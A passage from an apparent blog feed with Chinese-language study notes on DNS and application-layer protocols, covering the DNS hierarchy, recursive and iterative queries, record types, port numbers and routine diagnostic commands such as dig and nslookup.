    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>六周总结：DNS和其他应用层协议</title>
    <link href="/2025/11/10/%E5%85%AD%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9ADNS%E5%92%8C%E5%85%B6%E4%BB%96%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/11/10/%E5%85%AD%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9ADNS%E5%92%8C%E5%85%B6%E4%BB%96%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="第六周总结：DNS和其他应用层协议"><a href="#第六周总结：DNS和其他应用层协议" class="headerlink" title="第六周总结：DNS和其他应用层协议"></a>第六周总结：DNS和其他应用层协议</h1><h2 id="本周学习内容"><a href="#本周学习内容" class="headerlink" title="本周学习内容"></a>本周学习内容</h2><h3 id="Day-35-DNS深入"><a href="#Day-35-DNS深入" class="headerlink" title="Day 35: DNS深入"></a>Day 35: DNS深入</h3><p><strong>核心内容</strong>：</p><ul><li>✅ DNS层级结构（根→TLD→权威）</li><li>✅ 递归查询 vs 迭代查询</li><li>✅ DNS记录类型（A&#x2F;AAAA&#x2F;CNAME&#x2F;MX&#x2F;NS等）</li><li>✅ DNS缓存机制和TTL</li><li>✅ 实现DNS查询工具</li></ul><p><strong>关键知识点</strong>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss">DNS查询流程：<br>客户端 → 本地DNS（递归）<br>本地DNS → 其他DNS（迭代）<br>  ├─ 根DNS<br>  ├─ TLD DNS (.com)<br>  └─ 权威DNS (example.com)<br><br>缓存层级：<br>浏览器 → OS → 本地DNS → 远程DNS<br></code></pre></td></tr></table></figure><h3 id="Day-36-40-其他应用层协议"><a href="#Day-36-40-其他应用层协议" class="headerlink" title="Day 36-40: 其他应用层协议"></a>Day 36-40: 其他应用层协议</h3><p><strong>涵盖内容</strong>：</p><ul><li>DNS安全（DNSSEC、DoH、DoT）</li><li>FTP&#x2F;SFTP文件传输</li><li>SMTP&#x2F;POP3&#x2F;IMAP邮件协议</li><li>应用层协议总结</li></ul><hr><h2 id="核心协议对比"><a href="#核心协议对比" class="headerlink" title="核心协议对比"></a>核心协议对比</h2><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tap">┌─────────┬──────┬────────────┬──────────────┐<br>│ 协议    │ 端口 │ 传输层     │ 主要用途     │<br>├─────────┼──────┼────────────┼──────────────┤<br>│ HTTP    │<span class="hljs-number"> 80 </span>  │ TCP        │ Web浏览      │<br>│ HTTPS   │<span class="hljs-number"> 443 </span> │ TCP+TLS    │ 安全Web      │<br>│ DNS     │<span class="hljs-number"> 53 </span>  │ UDP/TCP    │ 域名解析     │<br>│ FTP     │<span class="hljs-number"> 21 </span>  │ TCP        │ 文件传输     │<br>│ SFTP    │<span class="hljs-number"> 22 </span>  │ TCP+SSH    │ 安全文件传输 │<br>│ SMTP    │<span class="hljs-number"> 25 </span>  │ TCP        │ 发送邮件     │<br>│ POP3    │<span class="hljs-number"> 110 </span> │ TCP        │ 接收邮件     │<br>│ IMAP    │<span class="hljs-number"> 143 </span> │ TCP        │ 管理邮件     │<br>│ SSH     │<span class="hljs-number"> 22 </span>  │ TCP        │ 远程登录     │<br>└─────────┴──────┴────────────┴──────────────┘<br></code></pre></td></tr></table></figure><hr><h2 id="学习成果"><a href="#学习成果" class="headerlink" title="学习成果"></a>学习成果</h2><h3 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h3><ul><li>✅ 理解DNS完整查询流程</li><li>✅ 掌握应用层主要协议</li><li>✅ 了解协议安全机制</li><li>✅ 理解缓存和性能优化</li></ul><h3 id="编程能力"><a href="#编程能力" class="headerlink" title="编程能力"></a>编程能力</h3><ul><li>✅ 实现DNS查询工具</li><li>✅ 构造和解析DNS报文</li><li>✅ 使用Python网络库</li><li>✅ 处理二进制协议</li></ul><h3 id="实战能力"><a href="#实战能力" class="headerlink" title="实战能力"></a>实战能力</h3><ul><li>✅ 能够诊断DNS问题</li><li>✅ 能够选择合适的协议</li><li>✅ 能够优化应用性能</li><li>✅ 能够实现简单协议</li></ul><hr><h2 id="重点回顾"><a href="#重点回顾" class="headerlink" title="重点回顾"></a>重点回顾</h2><h3 id="DNS查询类型"><a href="#DNS查询类型" class="headerlink" title="DNS查询类型"></a>DNS查询类型</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">递归查询：<br><span class="hljs-bullet">- </span>客户端问一次<br><span class="hljs-bullet">- </span>DNS服务器负责全部查询<br><span class="hljs-bullet">- </span>适合客户端<br><br>迭代查询：<br><span class="hljs-bullet">- </span>每次返回下一步指引<br><span class="hljs-bullet">- </span>客户端多次查询<br><span class="hljs-bullet">- </span>减轻服务器负担<br></code></pre></td></tr></table></figure><h3 id="DNS记录类型"><a href="#DNS记录类型" class="headerlink" title="DNS记录类型"></a>DNS记录类型</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-keyword">A</span>      → IPv4地址<br><span class="hljs-keyword">AAAA</span>   → IPv6地址<br><span class="hljs-keyword">CNAME</span>  → 别名<br><span class="hljs-keyword">MX</span>     → 邮件服务器<br><span class="hljs-keyword">NS</span>     → DNS服务器<br><span class="hljs-keyword">TXT</span>    → 文本信息<br><span class="hljs-keyword">SOA</span>    → 授权信息<br></code></pre></td></tr></table></figure><h3 id="应用层设计模式"><a href="#应用层设计模式" class="headerlink" title="应用层设计模式"></a>应用层设计模式</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 请求-响应模式<br><span class="hljs-bullet">   -</span> HTTP, DNS, FTP<br>   <br><span class="hljs-bullet">2.</span> 推送模式<br><span class="hljs-bullet">   -</span> WebSocket, SMTP<br><br><span class="hljs-bullet">3.</span> 订阅-发布模式<br><span class="hljs-bullet">   -</span> MQTT, Redis Pub/Sub<br></code></pre></td></tr></table></figure><hr><h2 id="常见问题解决"><a href="#常见问题解决" class="headerlink" title="常见问题解决"></a>常见问题解决</h2><h3 id="DNS问题"><a href="#DNS问题" class="headerlink" title="DNS问题"></a>DNS问题</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">问题：DNS解析慢<br>解决：<br><span class="hljs-bullet">1.</span> 更换快速DNS（8.8.8.8, 1.1.1.1）<br><span class="hljs-bullet">2.</span> 启用DNS缓存<br><span class="hljs-bullet">3.</span> 减少TTL（临时）<br><span class="hljs-bullet">4.</span> 使用DoH加密查询<br><br>问题：DNS劫持<br>解决：<br><span class="hljs-bullet">1.</span> 使用DNSSEC<br><span class="hljs-bullet">2.</span> 使用DoH/DoT<br><span class="hljs-bullet">3.</span> 验证DNS响应<br></code></pre></td></tr></table></figure><h3 id="邮件问题"><a href="#邮件问题" class="headerlink" title="邮件问题"></a>邮件问题</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">问题：邮件发送失败<br>检查：<br><span class="hljs-bullet">1.</span> SMTP服务器地址和端口<br><span class="hljs-bullet">2.</span> 认证信息<br><span class="hljs-bullet">3.</span> TLS/SSL设置<br><span class="hljs-bullet">4.</span> SPF/DKIM/DMARC配置<br></code></pre></td></tr></table></figure><hr><h2 id="性能优化技巧"><a href="#性能优化技巧" class="headerlink" title="性能优化技巧"></a>性能优化技巧</h2><h3 id="DNS优化"><a href="#DNS优化" class="headerlink" title="DNS优化"></a>DNS优化</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 使用快速DNS服务器<br><span class="hljs-bullet">   -</span> Google: 8.8.8.8<br><span class="hljs-bullet">   -</span> Cloudflare: 1.1.1.1<br><span class="hljs-bullet">   -</span> 阿里: 223.5.5.5<br><br><span class="hljs-bullet">2.</span> 合理设置TTL<br><span class="hljs-bullet">   -</span> 稳定记录：3600-86400秒<br><span class="hljs-bullet">   -</span> 变化记录：300-600秒<br><br><span class="hljs-bullet">3.</span> 启用缓存<br><span class="hljs-bullet">   -</span> 浏览器缓存<br><span class="hljs-bullet">   -</span> OS缓存<br><span class="hljs-bullet">   -</span> 应用缓存<br><br><span class="hljs-bullet">4.</span> 预解析<br>   <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;dns-prefetch&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;//example.com&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="协议选择"><a href="#协议选择" class="headerlink" title="协议选择"></a>协议选择</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Web应用：<br><span class="hljs-bullet">- </span>HTTP/2 或 HTTP/3<br><span class="hljs-bullet">- </span>启用gzip压缩<br><span class="hljs-bullet">- </span>使用CDN<br><br>文件传输：<br><span class="hljs-bullet">- </span>小文件：HTTP<br><span class="hljs-bullet">- </span>大文件：FTP/SFTP<br><span class="hljs-bullet">- </span>安全传输：SFTP<br><br>实时通信：<br><span class="hljs-bullet">- </span>WebSocket<br><span class="hljs-bullet">- </span>Server-Sent Events<br></code></pre></td></tr></table></figure><hr><h2 id="实用工具"><a href="#实用工具" class="headerlink" title="实用工具"></a>实用工具</h2><h3 id="DNS工具"><a href="#DNS工具" class="headerlink" title="DNS工具"></a>DNS工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查询DNS</span><br>nslookup www.example.com<br>dig www.example.com<br>host www.example.com<br><br><span class="hljs-comment"># 追踪DNS查询</span><br>dig +trace www.example.com<br><br><span class="hljs-comment"># 查看DNS缓存</span><br><span class="hljs-comment"># Windows</span><br>ipconfig /displaydns<br><span class="hljs-comment"># Linux</span><br>systemd-resolve --statistics<br></code></pre></td></tr></table></figure><h3 id="网络诊断"><a href="#网络诊断" class="headerlink" title="网络诊断"></a>网络诊断</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 测试连通性</span><br>ping example.com<br>telnet smtp.example.com 25<br><br><span class="hljs-comment"># 查看DNS解析</span><br>dig @8.8.8.8 example.com<br>nslookup example.com 1.1.1.1<br></code></pre></td></tr></table></figure><hr><h2 id="下周预告"><a href="#下周预告" class="headerlink" title="下周预告"></a>下周预告</h2><p><strong>第七周：TCP深入分析（Day 41-47）</strong></p><p>学习内容：</p><ul><li>TCP三次握手详解</li><li>TCP四次挥手和状态机</li><li>滑动窗口和流量控制</li><li>拥塞控制算法</li><li>TCP性能优化</li><li>实战项目</li></ul><p>重点：</p><ul><li>深入理解TCP可靠性机制</li><li>掌握TCP性能调优</li><li>理解Linux网络栈</li></ul><hr><h2 id="学习建议"><a href="#学习建议" class="headerlink" title="学习建议"></a>学习建议</h2><h3 id="必须掌握"><a href="#必须掌握" class="headerlink" title="必须掌握"></a>必须掌握</h3><ol><li>✅ DNS完整查询流程</li><li>✅ 常见DNS记录类型</li><li>✅ HTTP&#x2F;HTTPS工作原理</li><li>✅ 邮件协议基础</li></ol><h3 id="实践任务"><a href="#实践任务" class="headerlink" title="实践任务"></a>实践任务</h3><ul><li><input disabled="" type="checkbox"> 搭建本地DNS服务器</li><li><input disabled="" type="checkbox"> 实现FTP客户端</li><li><input disabled="" type="checkbox"> 发送SMTP邮件</li><li><input disabled="" type="checkbox"> 分析DNS流量</li></ul><h3 id="扩展学习"><a href="#扩展学习" class="headerlink" title="扩展学习"></a>扩展学习</h3><ul><li>RFC 1035: DNS协议规范</li><li>RFC 4033-4035: DNSSEC</li><li>RFC 5321: SMTP</li><li>RFC 3501: IMAP</li></ul><hr><p><strong>进度：40&#x2F;120天（33.3%）</strong></p><p>第六周完成！应用层协议学习圆满结束！</p><p>下周进入传输层深入学习，敬请期待！</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>35天：DNS深入 - 递归与迭代查询</title>
    <link href="/2025/11/10/35%E5%A4%A9%EF%BC%9ADNS%E6%B7%B1%E5%85%A5%20-%20%E9%80%92%E5%BD%92%E4%B8%8E%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2/"/>
    <url>/2025/11/10/35%E5%A4%A9%EF%BC%9ADNS%E6%B7%B1%E5%85%A5%20-%20%E9%80%92%E5%BD%92%E4%B8%8E%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="第35天：DNS深入-递归与迭代查询"><a href="#第35天：DNS深入-递归与迭代查询" class="headerlink" title="第35天：DNS深入 - 递归与迭代查询"></a>第35天：DNS深入 - 递归与迭代查询</h1><blockquote><p>“DNS就像互联网的电话簿，将域名翻译成IP地址！”</p></blockquote><h2 id="📚-今日目标"><a href="#📚-今日目标" class="headerlink" title="📚 今日目标"></a>📚 今日目标</h2><ul><li>深入理解DNS工作原理</li><li>掌握递归查询和迭代查询</li><li>学习DNS记录类型</li><li>理解DNS缓存机制</li><li>实现DNS查询工具</li></ul><hr><h2 id="1-DNS基础回顾"><a href="#1-DNS基础回顾" class="headerlink" title="1. DNS基础回顾"></a>1. DNS基础回顾</h2><h3 id="1-1-DNS是什么？"><a href="#1-1-DNS是什么？" class="headerlink" title="1.1 DNS是什么？"></a>1.1 DNS是什么？</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs abnf">DNS (Domain Name System) - 域名系统<br><br>作用：将人类可读的域名转换为机器可读的IP地址<br><br>示例：<br>www.example.com  →  <span class="hljs-number">93.184</span>.<span class="hljs-number">216.34</span><br><br>生活化类比：<br><span class="hljs-attribute">DNS</span> <span class="hljs-operator">=</span> 电话簿<br>域名 <span class="hljs-operator">=</span> 人名（张三）<br>IP地址 <span class="hljs-operator">=</span> 电话号码（<span class="hljs-number">138</span>-xxxx-xxxx）<br><br>你记得住<span class="hljs-string">&quot;张三&quot;</span>，但记不住他的电话号码<br>DNS帮你把<span class="hljs-string">&quot;张三&quot;</span>翻译成具体的电话号码<br></code></pre></td></tr></table></figure><h3 id="1-2-为什么需要DNS？"><a href="#1-2-为什么需要DNS？" class="headerlink" title="1.2 为什么需要DNS？"></a>1.2 为什么需要DNS？</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs armasm">问题：如果没有DNS<br><br>访问网站需要记住<span class="hljs-built_in">IP</span>地址：<br>- 访问百度：<span class="hljs-number">39</span>.<span class="hljs-number">156</span>.<span class="hljs-number">66</span>.<span class="hljs-number">10</span><br>- 访问谷歌：<span class="hljs-number">172</span>.<span class="hljs-number">217</span>.<span class="hljs-number">160</span>.<span class="hljs-number">68</span><br>- 访问GitHub：<span class="hljs-number">20</span>.<span class="hljs-number">205</span>.<span class="hljs-number">243</span>.<span class="hljs-number">166</span><br><br>缺点：<br>❌ <span class="hljs-built_in">IP</span>地址难记<br>❌ <span class="hljs-built_in">IP</span>地址会变化<br>❌ 无法使用有意义的名称<br><br>有了DNS：<br>✅ 记住域名即可：www.baidu.com<br>✅ <span class="hljs-built_in">IP</span>变化对用户透明<br>✅ 域名有意义且易记<br></code></pre></td></tr></table></figure><hr><h2 id="2-DNS层级结构"><a href="#2-DNS层级结构" class="headerlink" title="2. DNS层级结构"></a>2. DNS层级结构</h2><h3 id="2-1-DNS树状结构"><a href="#2-1-DNS树状结构" class="headerlink" title="2.1 DNS树状结构"></a>2.1 DNS树状结构</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs markdown">DNS命名空间是一个树状层级结构：<br><br><span class="hljs-code">                    根域 (.)</span><br><span class="hljs-code">                      |</span><br><span class="hljs-code">    ┌─────────────────┼─────────────────┐</span><br><span class="hljs-code">    |                 |                 |</span><br><span class="hljs-code">   com               org               cn</span><br><span class="hljs-code">    |                 |                 |</span><br><span class="hljs-code">┌───┴───┐         ┌───┴───┐         ┌───┴───┐</span><br><span class="hljs-code">|       |         |       |         |       |</span><br><span class="hljs-code">example google   wikipedia ietf    baidu  163</span><br><span class="hljs-code">|</span><br><span class="hljs-code">www</span><br><span class="hljs-code"></span><br>完整域名（FQDN）：www.example.com.<br><span class="hljs-bullet">-</span> www: 主机名<br><span class="hljs-bullet">-</span> example: 二级域名<br><span class="hljs-bullet">-</span> com: 顶级域名（TLD）<br><span class="hljs-bullet">-</span> .: 根域（通常省略）<br><br>域名层级（从右到左）：<br><span class="hljs-bullet">1.</span> 根域 (Root): .<br><span class="hljs-bullet">2.</span> 顶级域 (TLD): com, org, cn, net<br><span class="hljs-bullet">3.</span> 二级域 (SLD): example, google, baidu<br><span class="hljs-bullet">4.</span> 子域 (Subdomain): www, mail, ftp<br><br>常见顶级域名：<br>通用顶级域（gTLD）：<br><span class="hljs-bullet">-</span> .com: 商业<br><span class="hljs-bullet">-</span> .org: 组织<br><span class="hljs-bullet">-</span> .net: 网络<br><span class="hljs-bullet">-</span> .edu: 教育<br><span class="hljs-bullet">-</span> .gov: 政府<br><br>国家顶级域（ccTLD）：<br><span class="hljs-bullet">-</span> .cn: 中国<br><span class="hljs-bullet">-</span> .us: 美国<br><span class="hljs-bullet">-</span> .uk: 英国<br><span class="hljs-bullet">-</span> .jp: 日本<br></code></pre></td></tr></table></figure><h3 id="2-2-DNS服务器层级"><a href="#2-2-DNS服务器层级" class="headerlink" title="2.2 DNS服务器层级"></a>2.2 DNS服务器层级</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs scss">DNS服务器架构：<br><br>┌─────────────────────────────────────────┐<br>│ 根DNS服务器 (Root DNS Servers)          │<br>│ - 全球<span class="hljs-number">13</span>个根服务器集群                   │<br>│ - 知道所有TLD服务器的位置                │<br>└─────────────────────────────────────────┘<br>              ↓<br>┌─────────────────────────────────────────┐<br>│ 顶级域DNS服务器 (TLD DNS Servers)       │<br>│ - <span class="hljs-selector-class">.com</span>, <span class="hljs-selector-class">.org</span>, <span class="hljs-selector-class">.cn</span>等的权威服务器         │<br>│ - 知道各自域下的权威服务器位置           │<br>└─────────────────────────────────────────┘<br>              ↓<br>┌─────────────────────────────────────────┐<br>│ 权威DNS服务器 (Authoritative Servers)   │<br>│ - 存储域名的实际DNS记录                  │<br>│ - example<span class="hljs-selector-class">.com</span>的权威服务器                │<br>└─────────────────────────────────────────┘<br>              ↓<br>┌─────────────────────────────────────────┐<br>│ 本地DNS服务器 (Local/Recursive Servers) │<br>│ - ISP提供或自己配置                      │<br>│ - 执行实际的DNS查询                      │<br>│ - 缓存查询结果                           │<br>└─────────────────────────────────────────┘<br></code></pre></td></tr></table></figure><hr><h2 id="3-DNS查询类型"><a href="#3-DNS查询类型" class="headerlink" title="3. DNS查询类型"></a>3. DNS查询类型</h2><h3 id="3-1-递归查询（Recursive-Query）"><a href="#3-1-递归查询（Recursive-Query）" class="headerlink" title="3.1 递归查询（Recursive Query）"></a>3.1 递归查询（Recursive Query）</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs vim">递归查询流程：<br><br>客户端只需要问一次，DNS服务器负责完成所有查询<br><br>┌──────────┐<br>│  客户端  │<br>└────┬─────┘<br>     │ <span class="hljs-number">1</span>. 查询 www.example.<span class="hljs-keyword">com</span><br>     ↓<br>┌────────────────┐<br>│ 本地DNS服务器  │ ← 递归查询的核心<br>└────┬───────────┘<br>     │ <span class="hljs-number">2</span>. 查询根服务器<br>     ↓<br>┌────────────────┐<br>│  根DNS服务器   │<br>└────┬───────────┘<br>     │ <span class="hljs-number">3</span>. 返回.<span class="hljs-keyword">com</span>服务器地址<br>     ↓<br>┌────────────────┐<br>│ 本地DNS服务器  │<br>└────┬───────────┘<br>     │ <span class="hljs-number">4</span>. 查询.<span class="hljs-keyword">com</span>服务器<br>     ↓<br>┌────────────────┐<br>│ .<span class="hljs-keyword">com</span> DNS服务器 │<br>└────┬───────────┘<br>     │ <span class="hljs-number">5</span>. 返回example.<span class="hljs-keyword">com</span>服务器地址<br>     ↓<br>┌────────────────┐<br>│ 本地DNS服务器  │<br>└────┬───────────┘<br>     │ <span class="hljs-number">6</span>. 查询example.<span class="hljs-keyword">com</span>服务器<br>     ↓<br>┌─────────────────────┐<br>│ example.<span class="hljs-keyword">com</span>服务器   │<br>└────┬────────────────┘<br>     │ <span class="hljs-number">7</span>. 返回www的IP地址<br>     ↓<br>┌────────────────┐<br>│ 本地DNS服务器  │<br>└────┬───────────┘<br>     │ <span class="hljs-number">8</span>. 返回最终答案<br>     ↓<br>┌──────────┐<br>│  客户端  │ ← 得到IP地址<br>└──────────┘<br><br>特点：<br>✅ 客户端简单，只问一次<br>✅ 服务器负责所有查询工作<br>✅ 结果可以被缓存<br>❌ 服务器负担重<br><br>生活化类比：<br>递归查询 = 找秘书帮忙<br>你：<span class="hljs-string">&quot;帮我查一下张三的电话&quot;</span><br>秘书：<span class="hljs-string">&quot;好的，我帮你查&quot;</span><br>秘书查遍所有通讯录，然后告诉你结果<br></code></pre></td></tr></table></figure><h3 id="3-2-迭代查询（Iterative-Query）"><a href="#3-2-迭代查询（Iterative-Query）" class="headerlink" title="3.2 迭代查询（Iterative Query）"></a>3.2 迭代查询（Iterative Query）</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs stylus">迭代查询流程：<br><br>每次查询返回下一步应该问谁<br><br>┌──────────┐<br>│  客户端  │ （本地DNS服务器对客户端是递归）<br>└────┬─────┘<br>     │ <span class="hljs-number">1</span>. 查询 www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br>     ↓<br>┌────────────────┐<br>│ 本地DNS服务器  │ ← 从这里开始是迭代查询<br>└────┬───────────┘<br>     │ <span class="hljs-number">2</span>. 查询根服务器<br>     ↓<br>┌────────────────┐<br>│  根DNS服务器   │<br>└────┬───────────┘<br>     │ <span 